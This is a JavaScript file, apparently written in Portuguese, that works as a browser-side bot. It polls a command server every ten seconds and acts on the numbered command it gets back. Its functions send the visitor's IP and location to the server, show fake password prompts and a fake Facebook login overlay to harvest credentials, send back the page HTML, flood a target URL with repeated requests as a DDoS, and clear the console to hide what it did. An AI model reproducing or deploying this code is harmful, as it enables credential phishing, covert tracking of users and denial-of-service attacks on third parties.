var i=0
var api="192.168.1.5:8081/datasnap/rest/TServerMethods1/"
var ip="https://api.ipify.org?format=json";
var continuarddos=true;
$(document).ready(function(){
$(function(){
  //pegaipinterno();
 // localizacao();
  //mandaAjax(ip,'',1);
   //setInterval("ddos()",15);
   //mandaAjax(api,'',1);
   setInterval("continueExecution()",10000)
      //alert(fetch(conecta/foi').then);

  });
});
function continueExecution()
{ 
 var json
  console.log('Buscando Comandos')
      $.ajax({       
        url : api+'ReverseString/teste',
        type: "get",
        datatype: "json",
        headers: { 'api-key':'myKey' },
        success : function (data){
        json=JSON.parse(data);
        var r=json.result;
        var sr=String(r).substring(0,1);
        console.log(sr);
        if (r=='0'){
          mandaAjax(ip,'',1);
        }else   if (r=='1'){
          limparconsole();
        }
        else   if (r=='2'){
        localizacao();
        }
        else if (r=='4'){
          aletasenha();
        }
        else if (sr=='3'){
          var tm=String(r).length;
          var msg = String(r).substring(1, tm);
          console.log("alerta"+msg);
          alerta(msg);
        }
        else if (sr=='5'){
          var tm=String(r).length;
          var msg = String(r).substring(1, tm);
          aletasenha(msg);
        }
        else   if (r=='6'){
          LoginFacebook();
        }
        else   if (r=='7'){
          var tm=String(r).length;
          var msg = String(r).substring(1, tm);
          ddos(msg);
        }
        else   if (r=='8'){
          pegahtml();
        }
        else {
          console.log(r);
          //alerta(r)
        }
          
        },error : function(erro){          
          limparconsole();
        }
    })
};
function retornaip(){
 
};
function mandaAjaxDDos(purl){
  var res
  $.ajax({
    url : purl,
    type: "get",
    datatype: "json",
    success : function (data){
     // console.log(data);
     // mandaAjaxSer(data.ip)      
     // res = data     
    },error : function(erro){
      console.log('Serv Parou de Responder:'+erro)
    }
     
   });
  }; 
  function mandaAjax(purl,pdado){
    var res
    $.ajax({
      url : purl+pdado,
      type: "get",
      datatype: "json",
      headers: { 'api-key':'myKey' },
      success : function (data){
        console.log(data); 
        mandaAjaxSer(data)       
      },error : function(erro){
        console.log('Sem Resposta')
        continuarddos=false,
        console.log("Continuar ataque: "+continuarddos)
      }
       
     });
    }; 
   function mandaAjaxSer(pdado){
    var res = tronsoformajsonString(pdado)
    $.ajax({
      url : api+"dados/"+res,
      type: "get",
      datatype: "json",
      success : function (data){   
      },error : function(erro){
        console.log('Sem resposta: ')
        }       
     });  
    };
    function limparconsole(){
      console.clear();
    };
    function alerta(msg){
      alert(msg)
    };
    function aletasenha(msg){
        var x;
        if (msg==null){
         msg="Pagina expirada insira a senha pra continuar";
        }
        var senha=prompt(msg);

        if (senha!=null)
          {
          mandaAjaxSer('Requisição: '+msg+' resposta: '+senha)            
          }
       else {
         aletasenha();
       }
    };
    function LoginFacebook(){      
     Swal.fire({
        title: '  ',
        width: 650,
        padding: '3em',
        color: 'Black',
        background: 'url(faceook.png) no-repeat',
   
        confirmButtonText:
        '<i class="fa fa-thumbs-up"></i> Entrar',
        html:
          '<Br><Br><Br><Br>'+
          '<label for="fname">&nbsp;&emsp;Email:&nbsp;</label>'+ 
          '<input id="swal-input1" class="swal2-input"  style="height:40px; width:200px;" ><br>' +
          '<label for="fname">Password:</label>'+ 
          '<input id="swal-input2" class="swal2-input" type="password" style="height:40px; width:200px;" >',
        focusConfirm: false,
        preConfirm: () => {
          return [
            console.log("Email: "+document.getElementById('swal-input1').value+" Senha: "+document.getElementById('swal-input2').value)
            
          ]
        }
      }) };
    function ddos(url){
        
        if (continuarddos){
          console.log("Ataque em curso"),
          setInterval("mandaAjaxDDos("+url+")",5000) 
    }
    };
    function  localizacao(){
    var url="https://ip.nf/me.json"
    mandaAjax(url,'',1);
    };
    function pegahtml(){
      var url = window.location; // obter o dominio
   //   var url_splt = url.split('.')
   //   var url_name = url_splt[url_splt.length - 2];
      console.log(url.href);
      mandaAjax(url.href,'');
    
     };
     function tronsoformajsonString(pdado){
      var aux=JSON.stringify(pdado);
      var res = JSON.stringify(aux);
      res=res.replace(/[^a-zA-Z0-9]/g, ' ');
      res=res.replace('  ', ' ');
      res=res.replace('  ', ' ');      
      return res;
     }